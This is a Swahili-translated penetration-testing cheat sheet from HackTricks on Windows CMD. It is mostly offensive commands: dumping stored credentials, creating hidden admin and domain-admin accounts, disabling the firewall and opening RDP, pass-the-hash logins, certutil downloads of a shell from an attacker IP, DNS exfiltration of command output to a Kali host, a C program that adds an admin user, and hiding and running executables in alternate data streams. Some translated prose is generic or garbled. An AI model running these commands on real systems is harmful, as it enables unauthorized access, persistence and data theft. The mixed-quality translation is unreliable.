```
### Vitambulisho

Credentials, au vitambulisho, ni habari za kibinafsi ambazo hutumiwa kuthibitisha utambulisho wa mtumiaji. Kwa kawaida, vitambulisho hujumuisha jina la mtumiaji na nenosiri. Vitambulisho vinatumika kwa kuingia kwenye mifumo mbalimbali, kama vile akaunti za mtandao, kompyuta, au programu.

Kwa mfano, unapotaka kuingia kwenye akaunti yako ya barua pepe, utahitaji kutumia vitambulisho vyako - jina la mtumiaji na nenosiri - ili kuthibitisha utambulisho wako na kupata upatikanaji wa akaunti yako.

Ni muhimu sana kuhakikisha kuwa vitambulisho vyako ni salama na siri. Usishiriki vitambulisho vyako na watu wengine na hakikisha kutumia nenosiri lenye nguvu ambalo ni vigumu kuhifadhiwa. Pia, ni vyema kubadilisha nenosiri mara kwa mara ili kuzuia uwezekano wa kuvuja kwa vitambulisho vyako na kudhibiti upatikanaji wa akaunti zako.
```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```
### Uthabiti na Watumiaji

#### Introduction

Katika mazingira ya udukuzi, uthabiti ni mchakato wa kudumisha upatikanaji wa mamlaka au udhibiti wa mfumo wa kompyuta kwa muda mrefu bila kugunduliwa. Katika kesi hii, tunazingatia uthabiti na watumiaji, ambapo lengo ni kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta kwa kutumia akaunti za watumiaji.

#### 1. Uthabiti na Akaunti za Watumiaji

Kuna njia kadhaa za kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta kwa kutumia akaunti za watumiaji. Hapa kuna baadhi ya njia hizo:

##### a. Kuanzisha Akaunti ya Utawala

Kuanzisha akaunti ya utawala ni njia moja ya kudumisha ufikiaji wa mamlaka. Akaunti ya utawala ina haki za juu zaidi kuliko akaunti za watumiaji wa kawaida, na kwa hivyo inaweza kutumiwa kutekeleza vitendo vya uthabiti.

##### b. Kuongeza Akaunti ya Watumiaji

Kuongeza akaunti ya watumiaji ni njia nyingine ya kudumisha ufikiaji wa mamlaka. Kwa kuunda akaunti ya watumiaji mpya na kuiweka kwenye kikundi cha watumiaji wenye haki za juu, unaweza kudumisha udhibiti wa mfumo wa kompyuta.

##### c. Kudumisha Akaunti ya Watumiaji Iliyopo

Kudumisha akaunti ya watumiaji iliyopo ni njia nyingine ya kudumisha ufikiaji wa mamlaka. Kwa kubadilisha nywila ya akaunti ya watumiaji au kwa kuongeza muda wa kumalizika kwa nywila, unaweza kuhakikisha kuwa akaunti hiyo inabaki kuwa na udhibiti wa mfumo wa kompyuta.

#### 2. Uthabiti na Huduma za Windows

Mbali na akaunti za watumiaji, unaweza pia kutumia huduma za Windows kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta. Hapa kuna njia kadhaa za kufanya hivyo:

##### a. Kuunda Huduma Mpya

Kwa kuunda huduma mpya, unaweza kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta. Huduma hizi zinaweza kuwa na haki za juu na zinaweza kutekeleza vitendo vya uthabiti.

##### b. Kubadilisha Huduma Iliyopo

Kwa kubadilisha huduma iliyopo, unaweza kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta. Kwa kubadilisha mali za huduma au kubadilisha njia ya kuanza huduma, unaweza kuhakikisha kuwa huduma hiyo inabaki kuwa na udhibiti wa mfumo wa kompyuta.

##### c. Kudumisha Huduma ya Windows Iliyopo

Kudumisha huduma ya Windows iliyopo ni njia nyingine ya kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta. Kwa kubadilisha mali za huduma ya Windows au kubadilisha njia ya kuanza huduma, unaweza kuhakikisha kuwa huduma hiyo inabaki kuwa na udhibiti wa mfumo wa kompyuta.

#### Hitimisho

Uthabiti na watumiaji ni sehemu muhimu ya mchakato wa uthabiti katika udukuzi. Kwa kutumia akaunti za watumiaji na huduma za Windows, unaweza kudumisha ufikiaji wa mamlaka au udhibiti wa mfumo wa kompyuta kwa muda mrefu bila kugunduliwa.
```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```
## Mtandao

### Violeshi, Njia, Bandari, Wenyeji na DNSCache

Violeshi, Njia, Bandari, Wenyeji na DNSCache ni sehemu muhimu za mtandao. Kuelewa jinsi wanavyofanya kazi na jinsi ya kuzitumia kwa ufanisi ni muhimu kwa pentesters. Katika sehemu hii, tutajifunza jinsi ya kuchunguza na kudhibiti violeshi, njia, bandari, wenyeji na DNSCache kwenye mfumo wa Windows. 

### Violeshi (Interfaces)

Violeshi ni sehemu za kimwili au za kawaida za mtandao ambazo zinawezesha uhusiano kati ya kompyuta na mtandao. Wanaweza kuwa waya au waya hewa. Kwa kawaida, kila kadi ya mtandao ina violeshi viwili: moja kwa ajili ya uhusiano wa waya na nyingine kwa uhusiano wa waya hewa. 

Unaweza kuona violeshi vilivyopo kwenye mfumo wako kwa kutumia amri ifuatayo:

```plaintext
ipconfig /all
```

### Njia (Routes)

Njia ni maelekezo ambayo mfumo wa uendeshaji hutumia kuamua njia gani ya mtandao itumike kufikia anwani fulani ya IP. Kwa kawaida, mfumo wa uendeshaji utakuwa na njia moja ya msingi na njia nyingine za ziada. 

Unaweza kuona njia zilizopo kwenye mfumo wako kwa kutumia amri ifuatayo:

```plaintext
route print
```

### Bandari (Ports)

Bandari ni nambari za kitambulisho ambazo hutumiwa kwa mawasiliano kati ya programu au vifaa vya mtandao. Kuna bandari nyingi zilizotengwa kwa matumizi maalum, kama vile bandari 80 kwa HTTP na bandari 443 kwa HTTPS. 

Unaweza kuona bandari zilizofunguliwa kwenye mfumo wako kwa kutumia amri ifuatayo:

```plaintext
netstat -ano
```

### Wenyeji (Hosts)

Wenyeji ni anwani za IP na majina ya kikoa ambayo yanahusishwa na kompyuta au vifaa vingine kwenye mtandao. Kwa kawaida, mfumo wa uendeshaji utahifadhi habari hii kwenye faili ya "hosts". 

Unaweza kuona na kuhariri faili ya "hosts" kwa kutumia amri ifuatayo:

```plaintext
notepad C:\Windows\System32\drivers\etc\hosts
```

### DNSCache

DNSCache ni kumbukumbu ya muda mfupi ambayo mfumo wa uendeshaji hutumia kuhifadhi maelezo ya DNS (Domain Name System). Inasaidia kuharakisha mchakato wa kutafsiri majina ya kikoa kuwa anwani za IP. 

Unaweza kuona na kusafisha DNSCache kwa kutumia amri ifuatayo:

```plaintext
ipconfig /flushdns
```
```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```
### Firewall

### Kizuizi cha Moto

A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It acts as a barrier between a trusted internal network and an untrusted external network, such as the internet.

Kizuizi cha moto ni kifaa cha usalama wa mtandao ambacho huchunguza na kudhibiti trafiki ya mtandao ya kuingia na kutoka kulingana na sheria za usalama zilizopangwa mapema. Kinafanya kazi kama kizuizi kati ya mtandao wa ndani ulioaminika na mtandao usioaminika wa nje, kama vile mtandao wa intaneti.

Firewalls can be implemented in both hardware and software forms. They use various techniques, such as packet filtering, stateful inspection, and application-level gateways, to analyze network traffic and determine whether to allow or block specific connections.

Kizuizi cha moto kinaweza kutekelezwa katika aina za vifaa na programu. Hutumia mbinu mbalimbali, kama vile uchujaji wa pakiti, ukaguzi wa hali, na lango la kiwango cha programu, kuchambua trafiki ya mtandao na kuamua ikiwa itaruhusu au kuzuia uhusiano maalum.

Firewalls are an essential component of network security and are commonly used to protect against unauthorized access, malware, and other cyber threats. They help to create a secure network environment by enforcing security policies and controlling network traffic.

Kizuizi cha moto ni sehemu muhimu ya usalama wa mtandao na mara nyingi hutumiwa kulinda dhidi ya ufikiaji usiohalali, zisizo, na vitisho vingine vya mtandao. Husaidia kuunda mazingira salama ya mtandao kwa kutekeleza sera za usalama na kudhibiti trafiki ya mtandao.
```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add ‚ÄúHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```
### Kugawana

Kwenye mifumo ya Windows, unaweza kugawana folda na watumiaji wengine kwenye mtandao. Hii inaruhusu watumiaji wengine kupata na kuhariri faili kwenye folda yako. Kuna njia mbili za kugawana folda: kugawana folda kwa kutumia Command Prompt na kugawana folda kwa kutumia Windows Explorer.

#### Kugawana Folda kwa Kutumia Command Prompt

1. Fungua Command Prompt kwa kubonyeza Start, kisha uandike "cmd" na bonyeza Enter.
2. Tumia amri ifuatayo kuona orodha ya folda zilizoshirikiwa: `net share`
3. Tumia amri ifuatayo kuunda folda mpya ya kugawana: `net share jina_folda=lokesheni_folda /GRANT:jina_mtumiaji,permissions`
   - `jina_folda` ni jina unalotaka kuitumia kwa folda ya kugawana.
   - `lokesheni_folda` ni njia ya folda unayotaka kugawana.
   - `jina_mtumiaji` ni jina la mtumiaji ambaye unataka kumpa ruhusa ya kugawana folda.
   - `permissions` ni ruhusa unayotaka kumpa mtumiaji kwenye folda (kama vile "READ" au "FULL").
4. Tumia amri ifuatayo kuondoa kugawana folda: `net share jina_folda /DELETE`

#### Kugawana Folda kwa Kutumia Windows Explorer

1. Fungua Windows Explorer na nenda kwenye folda unayotaka kugawana.
2. Bonyeza kulia kwenye folda hiyo na chagua "Properties" kutoka kwenye menyu iliyochomoza.
3. Nenda kwenye kichupo cha "Sharing" na bonyeza "Advanced Sharing".
4. Angalia "Share this folder" na andika jina la kugawana folda.
5. Bonyeza "Permissions" na chagua mtumiaji ambaye unataka kumpa ruhusa ya kugawana folda.
6. Chagua ruhusa unayotaka kumpa mtumiaji kwenye folda (kama vile "Read" au "Full Control").
7. Bonyeza "OK" mara mbili kuthibitisha mabadiliko yako.

Kwa kufuata hatua hizi, unaweza kugawana folda kwenye mfumo wako wa Windows na watumiaji wengine kwenye mtandao.
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Wifi

#### Introduction

Wifi is a wireless technology that allows devices to connect to the internet or communicate with each other without the need for physical cables. It is commonly used in homes, offices, and public places to provide internet access to multiple devices simultaneously.

#### Wifi Security

Wifi networks can be vulnerable to various security threats, such as unauthorized access, data interception, and network attacks. To protect your wifi network, it is important to implement strong security measures, such as:

1. **Change Default Passwords**: Always change the default passwords of your wifi router and access points to prevent unauthorized access.

2. **Enable Encryption**: Use encryption protocols like WPA2 or WPA3 to secure your wifi network. Encryption ensures that data transmitted over the network is encrypted and cannot be easily intercepted.

3. **Disable SSID Broadcasting**: By disabling SSID broadcasting, you can make your wifi network invisible to unauthorized users. They will need to know the exact SSID to connect to your network.

4. **Use Strong Passwords**: Set a strong password for your wifi network. A strong password should be long, complex, and include a combination of uppercase and lowercase letters, numbers, and special characters.

5. **Enable MAC Address Filtering**: MAC address filtering allows you to specify which devices can connect to your wifi network based on their MAC addresses. This adds an extra layer of security by only allowing authorized devices to connect.

6. **Regularly Update Firmware**: Keep your wifi router's firmware up to date to ensure that any security vulnerabilities are patched.

#### Wifi Hacking Techniques

Despite the security measures in place, wifi networks can still be vulnerable to hacking. Some common wifi hacking techniques include:

1. **Brute Force Attacks**: Brute force attacks involve systematically trying all possible combinations of passwords until the correct one is found. This can be time-consuming but can be effective if the password is weak.

2. **Dictionary Attacks**: Dictionary attacks involve using a pre-generated list of commonly used passwords to try and gain access to a wifi network. This method is more efficient than brute force attacks as it uses a predefined list of passwords.

3. **WPS Attacks**: WPS (Wi-Fi Protected Setup) is a feature that allows users to easily connect devices to a wifi network. However, it can be vulnerable to hacking if not properly configured.

4. **Evil Twin Attacks**: In an evil twin attack, a hacker sets up a fake wifi network that looks identical to a legitimate network. When users connect to the fake network, the hacker can intercept their data or gain unauthorized access.

5. **Packet Sniffing**: Packet sniffing involves capturing and analyzing network traffic to intercept sensitive information, such as usernames and passwords, being transmitted over a wifi network.

#### Conclusion

Wifi networks are convenient but can be vulnerable to security threats. By implementing strong security measures and being aware of common hacking techniques, you can protect your wifi network and ensure the safety of your data.
```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```
### SNMP

SNMP (Simple Network Management Protocol) ni itifaki ya mtandao inayotumiwa kwa usimamizi wa vifaa vya mtandao. Inaruhusu watumiaji kufuatilia na kudhibiti vifaa vya mtandao kwa njia ya kijijini. SNMP inatumia mifano ya data inayoitwa MIBs (Management Information Bases) kuwezesha ufuatiliaji na udhibiti wa vifaa vya mtandao.

Kuna matoleo tofauti ya SNMP, kama vile SNMPv1, SNMPv2, na SNMPv3. Kila toleo lina sifa na usalama wake mwenyewe. Kwa mfano, SNMPv3 inasaidia usimbuaji wa data na uthibitishaji wa kitambulisho, wakati SNMPv1 na SNMPv2 hazina usalama sawa.

Kwa wapenzi wa udukuzi, SNMP inaweza kuwa njia ya kuvunja usalama wa vifaa vya mtandao. Kwa kutumia zana kama snmpwalk na snmp-check, wadukuzi wanaweza kupata habari muhimu kuhusu vifaa vya mtandao, kama vile anwani za IP, majina ya mwenyeji, na hata vibali vya kuingia. Hii inaweza kuwapa ufikiaji usioidhinishwa kwa vifaa vya mtandao na kusababisha matatizo makubwa ya usalama.

Kwa hivyo, ni muhimu kwa wataalamu wa usalama kufahamu jinsi SNMP inavyofanya kazi na jinsi ya kuzuia mashambulizi ya udukuzi kupitia itifaki hii. Kwa kufuata miongozo ya usalama na kutekeleza hatua za kuhardika, tunaweza kuzuia ukiukaji wa usalama kupitia SNMP na kulinda vifaa vyetu vya mtandao.
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
### Vifaa vya Mtandao

#### Command: `ipconfig`

Command ya `ipconfig` inatoa habari kuhusu vifaa vya mtandao vilivyowekwa kwenye mfumo. Inaonyesha anwani za IP, anwani za MAC, na habari nyingine muhimu kama vile anwani ya lango la mtandao na anwani ya seva ya DNS.

#### Command: `netstat`

Command ya `netstat` inatoa habari kuhusu uhusiano wa mtandao unaofanya kazi kwenye mfumo. Inaonyesha anwani za IP na namba za bandari za uhusiano, hali ya uhusiano (kama vile kusikiliza, kusubiri, au kushikamana), na habari nyingine kama vile anwani za IP za wenzake.

#### Command: `arp`

Command ya `arp` inatoa habari kuhusu meza ya ARP (Address Resolution Protocol) kwenye mfumo. Inaonyesha anwani za IP na anwani za MAC zilizohifadhiwa kwenye meza ya ARP, ambayo inasaidia kubadilisha anwani za IP kuwa anwani za MAC.

#### Command: `ping`

Command ya `ping` inatumika kuangalia uhusiano na kujibu kwa anwani ya IP au jina la kikoa. Inatumia protoksi ya ICMP (Internet Control Message Protocol) kutuma pakiti za ujumbe na kupokea majibu kutoka kwa kifaa kinacholengwa. Inatoa habari kama vile wakati wa majibu na kiasi cha pakiti zilizopotea.

#### Command: `tracert`

Command ya `tracert` inatumika kufuatilia njia ya mtandao kutoka kwa mfumo hadi kwa anwani ya IP au jina la kikoa. Inatumia protoksi ya ICMP kutuma pakiti za ujumbe na kupokea majibu kutoka kwa vifaa vya mtandao kwenye njia. Inatoa habari kuhusu wakati wa majibu kutoka kwa kila kifaa kwenye njia.
```bash
ipconfig /all
```
### Orodha ya ARP

ARP (Address Resolution Protocol) ni itifaki inayotumiwa kwenye mitandao ya kompyuta kuunganisha anwani za IP na anwani za MAC. Orodha ya ARP ina habari kuhusu uhusiano kati ya anwani za IP na anwani za MAC kwenye mtandao.

Unaweza kuona orodha ya ARP kwenye Windows kwa kutumia amri ifuatayo:

```plaintext
arp -a
```

Amri hii itakupa orodha ya ARP iliyopo kwenye mfumo wako. Orodha hiyo itaonyesha anwani za IP na anwani za MAC zilizohifadhiwa kwenye mfumo wako. Inaweza kuwa muhimu katika kuchunguza na kurekebisha masuala ya mtandao.
```bash
arp -A
```
## Pakua

Bitsadmin.exe
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
CertReq.exe ni kifaa cha amri ya Windows kinachotumiwa kuzalisha na kusimamia maombi ya vyeti vya usalama. Inaruhusu watumiaji kuunda maombi ya vyeti vya umma na binafsi, kuwasilisha maombi hayo kwa mamlaka ya vyeti, na kusimamia vyeti vilivyotolewa. Kwa kutumia CertReq.exe, wapenzi wa udukuzi wanaweza kuchunguza na kuchambua vyeti vya usalama kwenye mfumo wa Windows.
```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```
Certutil.exe ni kifaa cha amri ya Windows kinachotumiwa kusimamia na kufanya kazi na vyeti vya dijiti. Inatoa uwezo wa kuunda, kusaini, kusasisha, na kusimamia vyeti vya dijiti. Pia inaweza kutumika kusimamia hifadhidata ya vyeti, kuchanganua vyeti, na kufanya shughuli zingine za usimamizi wa vyeti. Certutil.exe ni chombo muhimu kwa wapenzi wa uchunguzi wa usalama na wapima vipimo vya uchunguzi wa usalama.
```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```
**Pata zaidi kwa kutafuta `Pakua` katika [https://lolbas-project.github.io](https://lolbas-project.github.io/)**

## Mbali
```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```
### Kuepuka Kuzuia Matumizi ya Herufi

Kuna hali ambapo unaweza kukutana na kizuizi kinachozuia matumizi ya herufi fulani katika programu au mfumo. Hata hivyo, kuna njia ambazo unaweza kutumia kuzunguka kizuizi hicho na kuendelea na shughuli zako za udukuzi.

Moja ya njia hizo ni kwa kutumia herufi zingine ambazo zinafanana na herufi zilizozuiwa. Kwa mfano, ikiwa herufi "a" imezuiwa, unaweza kutumia herufi "4" ambayo inafanana na "a" kwa kuonekana. Kwa njia hii, unaweza kuandika maneno au amri zinazohitaji herufi zilizozuiwa bila kugunduliwa na kizuizi.

Kumbuka kuwa njia hii inaweza kutofanya kazi katika hali zote, na inategemea jinsi kizuizi kinavyotekelezwa. Ni muhimu kufanya majaribio na kuchunguza kwa uangalifu ili kuhakikisha kuwa njia hii inafanya kazi kabla ya kuendelea na shughuli zako za udukuzi.
```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```
### DOSfuscation

Inazalisha mstari wa CMD uliofichwa
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```
### Vizuizi vya Anwani ya Kusikiliza

Unaweza kusikiliza kwenye [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) bila kuwa na haki za msimamizi.
```bash
netsh http show urlacl
```
### Kifaa cha Shell ya DNS kwa Mikono

**Mvamizi** (Kali) lazima atumie moja kati ya chaguo hizi 2:
```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```
#### Mlengwa

**`kwa /f tokens`** mbinu: Hii inaturuhusu kutekeleza amri, kupata maneno X ya kwanza ya kila mstari na kuituma kupitia DNS kwenye seva yetu.
```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```
Unaweza pia **kuuelekeza** matokeo, na kisha **kusoma**.
```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```
## Kuita CMD kutoka kwenye kificho cha C

To call CMD from C code, you can use the `system()` function provided by the C standard library. This function allows you to execute a command in the command prompt.

To call CMD and execute a command, you need to include the `<stdlib.h>` header file in your C code. Then, you can use the `system()` function with the command you want to execute as a parameter.

Here is an example of how to call CMD from C code:

```c
#include <stdlib.h>

int main() {
    system("command_to_execute");
    return 0;
}
```

Replace `"command_to_execute"` with the actual command you want to run in CMD. When you run the C code, it will call CMD and execute the specified command.

Keep in mind that calling CMD from C code can be a security risk if not handled properly. Make sure to validate and sanitize any user input before passing it as a command to the `system()` function to prevent command injection vulnerabilities.
```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```
## Cheti cha Data za Kawaida (ADS/Cheti cha Data za Kawaida)

**Mifano imechukuliwa kutoka [https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f). Kuna mengi zaidi huko!**
```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
